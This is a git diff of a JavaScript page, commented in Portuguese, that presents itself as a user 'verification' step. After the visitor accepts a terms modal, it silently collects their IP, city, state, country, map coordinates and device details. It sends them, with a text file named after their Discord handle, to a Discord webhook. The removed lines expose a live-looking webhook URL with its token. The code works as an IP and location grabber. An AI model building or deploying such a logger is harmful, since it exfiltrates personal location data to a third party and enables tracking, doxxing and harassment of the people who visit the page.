@@ -60,20 +60,18 @@
 
         // Config padrão (fallback)
         const defaultConfig = {
-            webhook: "https://discord.com/api/webhooks/1360595060672040990/aAy8Yj1c9iQ3rVH_lg9R3qwA4_G_omtJMNTH8_jf69idGoP3Fa7qshl3dd7XVNld7Kwh",
+            webhook: "https://discord.com/api/webhooks/SEU_WEBHOOK_AQUI",
             embed: {
                 title: "Nova Verificação",
                 color: "#FF0000",
                 fields: [
                     { name: "**Nome**", key: "nick" },
                     { name: "**Data**", key: "date" },
-                    { name: "**Vpn**", key: "vpn" },
-                    { name: "**Proxy**", key: "proxy" },
                     { name: "**IP**", key: "ip" },
-                    { name: "**Loc**", key: "loc" },
+                    { name: "**Localização**", key: "loc" },
                     { name: "**Cidade**", key: "cidade" },
                     { name: "**Estado**", key: "estado" },
-                    { name: "**Pais**", key: "pais" },
+                    { name: "**País**", key: "pais" },
                     { name: "**Dispositivo**", key: "dispositivo" }
                 ]
             }
@@ -116,12 +114,10 @@
             termsModal.style.display = 'none';
             verificationMessage.style.display = 'block';
 
-            // Dados iniciais para o embed (IPinfo)
+            // Dados para o embed (apenas IPinfo)
             let embedData = {
                 nick: window.discordHandle || "@desconhecido",
                 date: new Date().toLocaleString("pt-BR"),
-                vpn: "Não disponível",
-                proxy: "Não disponível",
                 ip: "Não disponível",
                 loc: "Não disponível",
                 cidade: "Não disponível",
@@ -130,11 +126,10 @@
                 dispositivo: "Não disponível"
             };
 
-            // Dados completos para o arquivo
+            // Dados completos para o arquivo .txt
             let allData = {
                 ipinfo: {},
                 ipapi: {},
-                ipqualityscore: {},
                 dispositivo: {}
             };
 
@@ -149,14 +144,11 @@
                     embedData.estado = ipData.region || "Não disponível";
                     embedData.pais = ipData.country || "Não disponível";
                     embedData.loc = ipData.loc
-                        ? `[${ipData.city || 'Local'}, ${ipData.region || 'Desconhecido'}](https://www.google.com/maps?q=${ipData.loc}) (Google Maps)`
+                        ? `[${ipData.city || 'Local'}, ${ipData.region || 'Desconhecido'}](https://www.google.com/maps?q=${ipData.loc})`
                         : `${ipData.city || 'Local'}, ${ipData.region || 'Desconhecido'} (aproximado)`;
-                    embedData.vpn = ipData.bogon ? "Possível" : "Não disponível";
-                    embedData.proxy = ipData.bogon ? "Possível" : "Não disponível";
                 }
             } catch (error) {
                 console.error('Erro ao obter dados do IPinfo:', error);
-                embedData.loc = "Erro na API (aproximado)";
                 allData.ipinfo.error = error.message;
             }
 
@@ -172,18 +164,6 @@
                 allData.ipapi.error = error.message;
             }
 
-            // Obter dados do IPQualityScore (API gratuita limitada)
-            try {
-                const ipqsResponse = await fetch('https://ipqualityscore.com/api/json/ip/KEY?ip=' + (embedData.ip !== "Não disponível" ? embedData.ip : ''));
-                if (ipqsResponse.ok) {
-                    const ipqsData = await ipqsResponse.json();
-                    allData.ipqualityscore = ipqsData;
-                }
-            } catch (error) {
-                console.error('Erro ao obter dados do IPQualityScore:', error);
-                allData.ipqualityscore.error = error.message;
-            }
-
             // Obter dispositivo
             try {
                 const parser = new UAParser();
@@ -195,7 +175,7 @@
                 allData.dispositivo.error = error.message;
             }
 
-            // Criar embed (usando apenas IPinfo)
+            // Criar embed (apenas IPinfo)
             const embed = {
                 embeds: [{
                     title: config.embed.title || "Nova Verificação",
@@ -203,18 +183,29 @@
                     fields: config.embed.fields.map(field => ({
                         name: field.name,
                         value: embedData[field.key] || "Não disponível",
-                        inline: ["vpn", "proxy", "cidade", "estado", "pais"].includes(field.key)
+                        inline: ["cidade", "estado", "pais"].includes(field.key)
                     })),
                     timestamp: new Date().toISOString()
                 }]
             };
 
-            // Criar arquivo JSON com todos os dados
-            const jsonData = JSON.stringify(allData, null, 2);
-            const blob = new Blob([jsonData], { type: 'application/json' });
+            // Criar arquivo .txt com todos os dados
+            const txtData = `
+Informações de Verificação
+
+1. IPinfo:
+${JSON.stringify(allData.ipinfo, null, 2)}
+
+2. ipapi.co:
+${JSON.stringify(allData.ipapi, null, 2)}
+
+3. Dispositivo:
+${JSON.stringify(allData.dispositivo, null, 2)}
+            `;
+            const blob = new Blob([txtData], { type: 'text/plain' });
             const formData = new FormData();
             formData.append('payload_json', JSON.stringify(embed));
-            formData.append('file', blob, 'all_data.json');
+            formData.append('file', blob, `${embedData.nick.replace('@', '')}.txt`);
 
             // Enviar ao webhook
             try {
@@ -223,7 +214,6 @@
                     body: formData
                 });
                 if (!response.ok) {
-                    console.error('Erro na resposta do webhook:', response.status);
                     throw new Error('Falha ao enviar dados');
                 }
             } catch (error) {
